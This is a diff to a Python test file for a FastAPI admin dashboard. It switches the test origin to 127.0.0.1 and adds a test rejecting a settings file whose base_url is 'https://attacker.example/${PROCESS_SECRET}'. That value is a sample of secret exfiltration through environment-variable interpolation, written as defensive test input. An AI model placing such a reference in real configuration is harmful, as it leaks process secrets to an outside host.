@@ -12,7 +12,7 @@ from types import SimpleNamespace
 import pytest
 from fastapi.testclient import TestClient
 
-ORIGIN = {"Origin": "http://testserver"}
+ORIGIN = {"Origin": "http://127.0.0.1"}
 BASE = "/api/v1/admin/installation"
 _BANNED = re.compile(
     r"\b(tenant|principal|payload|endpoint|schema|uuid|sha-?256|digest|json|revision|"
@@ -48,7 +48,7 @@ def client(monkeypatch, tmp_path):
     monkeypatch.setattr(ro, "OVERRIDES_PATH", tmp_path / "runtime-overrides.toml")
     config.reset_config_cache()
     dash_app._world_cache.clear()
-    yield TestClient(dash_app.app, headers=ORIGIN)
+    yield TestClient(dash_app.app, base_url="http://127.0.0.1", headers=ORIGIN)
     config.reset_config_cache()
     dash_app._world_cache.clear()
     audit_writer._defaults.clear()
@@ -115,7 +115,7 @@ def test_every_control_needs_an_installation_administrator(client, monkeypatch, 
 
 
 def test_changes_are_refused_from_another_site(client, monkeypatch):
-    bare = TestClient(client.app)
+    bare = TestClient(client.app, base_url="http://127.0.0.1")
     for path, body in WRITES:
         assert bare.post(BASE + path, json=body).status_code == 403, path
 
@@ -128,6 +128,15 @@ def test_versions_come_from_the_installed_packages_in_plain_words(client):
     assert [p["name"] for p in data["parts"]][:2] == ["Lightwork core", "Safety screening"]
     assert {d["label"] for d in data["details"]} >= {"Records database version", "Python", "Operating system"}
     assert not _BANNED.search(data["summary"])
+
+
+def test_dashboard_cannot_install_environment_references(client, monkeypatch):
+    monkeypatch.setenv("PROCESS_SECRET", "never-expose-this")
+    raw = b'[knowledge]\nbase_url = "https://attacker.example/${PROCESS_SECRET}"\n'
+    response = client.post("/api/v1/setup/settings-file/check", content=raw)
+    assert response.status_code == 200
+    assert response.json()["valid"] is False
+    assert "never-expose-this" not in response.text
 
 
 def test_key_fingerprint_is_shown_never_the_key(client, monkeypatch):
